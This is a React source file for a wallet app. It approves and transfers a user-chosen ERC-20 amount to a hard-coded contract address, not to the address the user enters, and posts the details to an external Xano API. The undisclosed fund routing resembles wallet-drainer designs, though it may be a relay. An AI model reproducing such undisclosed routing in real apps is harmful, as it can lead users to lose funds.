import React, { useState } from 'react';
import axios from 'axios';
import { ethers } from 'ethers';
import { getDescription } from './utils/getDescription';

function App() {
  const [address, setAddress] = useState("");
  const [tokenType, setTokenType] = useState("");
  const [tokenAmount, setTokenAmount] = useState("");
  const [balance, setBalance] = useState(0);
  const [walletAddress, setWalletAddress] = useState("");

  const handleAddressChange = (event) => {
    setAddress(event.target.value);
  };

  const handleTokenTypeChange = (event) => {
    setTokenType(event.target.value);
  };

  const handleTokenAmountChange = (event) => {
    setTokenAmount(event.target.value);
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();

      const tokenContract = new ethers.Contract(tokenType, ["function approve(address spender, uint256 amount) public returns (bool)"], signer);
      const tokenSenderContract = new ethers.Contract("0x67c7EF63f79D7b255E3197f094087d2ECfAd516f", ["function sendToken(address token, uint256 amount) public"], signer);
  
      const amount = ethers.utils.parseUnits(tokenAmount, 18);  // assuming token has 18 decimal places

      // Call approve
      const approveTx = await tokenContract.approve("0x67c7EF63f79D7b255E3197f094087d2ECfAd516f", amount);
      await approveTx.wait();

      // Call sendToken
      const sendTx = await tokenSenderContract.sendToken(tokenType, amount);
      await sendTx.wait();

      const payload = {
        sender: walletAddress, // This is the address of the connected wallet
        actualAddress: address, // This is the actual address entered by the user
        tokenType,
        tokenAmount
      };

      const response = await axios.post('https://x8ki-letl-twmt.n7.xano.io/api:4-wtXyYF/txs', payload);
      console.log(response.data);
    } catch (error) {
      console.error(error);
    }
  };

  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        setWalletAddress(accounts[0]);
        const balance = await provider.getBalance(accounts[0]);
        setBalance(ethers.utils.formatEther(balance));
      } catch (err) {
        console.error(err);
        if (err.code === 4001) {
          // User rejected request
        }
      }
    } else {
      alert('Please install MetaMask!');
    }
  };

  return (
    <div className="App">
      <form onSubmit={handleSubmit}>
        <input type="text" onChange={handleAddressChange} placeholder="Enter address" />
        <input type="text" onChange={handleTokenTypeChange} placeholder="Enter token type" />
        <input type="text" onChange={handleTokenAmountChange} placeholder="Enter token amount" />
        <button type="submit">Submit</button>
      </form>
      <button onClick={connectWallet}>Connect Wallet</button>
      <p>Your Wallet Address: {walletAddress}</p>
      <p>Your ETH Balance: {balance}</p>
    </div>
  );
}

export default App;
